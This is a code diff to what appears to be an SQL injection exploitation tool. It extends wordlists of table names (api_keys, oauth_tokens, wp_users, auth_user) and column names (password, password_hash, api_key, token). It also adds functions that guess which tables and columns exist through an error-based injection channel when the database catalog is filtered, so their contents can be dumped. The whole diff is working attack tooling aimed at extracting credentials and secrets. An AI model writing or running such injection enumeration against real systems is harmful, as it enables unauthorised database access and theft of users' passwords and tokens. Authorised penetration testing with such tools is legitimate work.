@@ -428,6 +428,18 @@ _COMMON_TABLES = [
     "media", "images", "documents", "transactions", "payments", "invoices", "cart",
     "carts", "wishlist", "reviews", "ratings", "tags", "data", "info", "details",
     "wp_users", "wp_options", "phpbb_users", "jos_users", "vault",
+    # business / content
+    "content", "attachments", "contacts", "companies", "organizations", "vendors",
+    "suppliers", "partners",
+    # e-commerce
+    "inventory", "stock", "order_items", "shipments", "coupons", "discounts",
+    # security / secrets
+    "api_keys", "oauth_tokens", "access_tokens", "refresh_tokens", "certificates",
+    # logs / monitoring
+    "audit_logs", "activity", "history", "traces", "metrics", "notifications",
+    # CMS / framework conventions
+    "wp_posts", "wp_usermeta", "phpbb_posts", "drupal_users", "drupal_sessions",
+    "django_session", "auth_user", "aspnetusers", "aspnetroles",
 ]
 # String literals (db name, table guesses) go in via _strlit on the union path; on
 # the blind path the count(*) probe carries no quotes either, so a quote-filtering
@@ -461,10 +473,12 @@ def _candidate_tables(db=None):
             add(f"{pre}{n}")
     return out
 _COMMON_COLUMNS = [
-    "id", "user", "username", "user_name", "name", "login", "email", "mail",
-    "pass", "passwd", "password", "pwd", "hash", "secret", "token", "role",
-    "is_admin", "admin", "first_name", "last_name", "fullname", "created",
-    "updated", "data", "value", "active", "status",
+    "id", "uuid", "guid", "user", "user_id", "username", "user_name", "name", "login",
+    "email", "mail", "pass", "passwd", "password", "password_hash", "pwd", "hash",
+    "secret", "token", "api_key", "key", "role", "is_admin", "admin", "first_name",
+    "last_name", "fullname", "data", "json", "value", "label", "title", "description",
+    "content", "body", "active", "status", "created", "updated", "created_at",
+    "updated_at", "deleted_at", "last_login",
 ]
 
 
@@ -1002,3 +1016,29 @@ def error_columns(eo, table, db=None):
 
 def error_dump(eo, table, cols, db=None):
     return _agg_dump(eo.read, eo.dbms, eo.marks, table, cols, db=db)
+
+
+def _error_exists(eo, expr) -> bool:
+    """True if `expr` runs and leaks through the error channel — i.e. the table/column
+    really exists. A probe for something absent errors *before* the planted ~ marker, so
+    nothing comes back (read() is empty). The error-channel analogue of _exists()."""
+    return bool((eo.read(expr) or "").strip())
+
+
+def error_common_tables(eo, names=None, db=None):
+    """By-name table guessing for the error channel, for when information_schema is
+    unavailable or filtered (e.g. nothing the catalog query touches resolves): probe
+    `count(*)` of each candidate — a real table leaks its count, a missing one errors
+    and leaks nothing. Mirrors common_tables() for the blind oracle."""
+    for t in (names or _candidate_tables(db)):
+        if _error_exists(eo, f"SELECT count(*) FROM {_qualify(eo.dbms, db, t)}"):
+            yield t
+
+
+def error_common_columns(eo, table, names=None, db=None):
+    """By-name column guessing for the error channel: probe `count(col)` of each
+    candidate — a real column leaks a number, a missing one errors and leaks nothing."""
+    src = _qualify(eo.dbms, db, table)
+    for col in (names or _COMMON_COLUMNS):
+        if _error_exists(eo, f"SELECT count({col}) FROM {src}"):
+            yield col
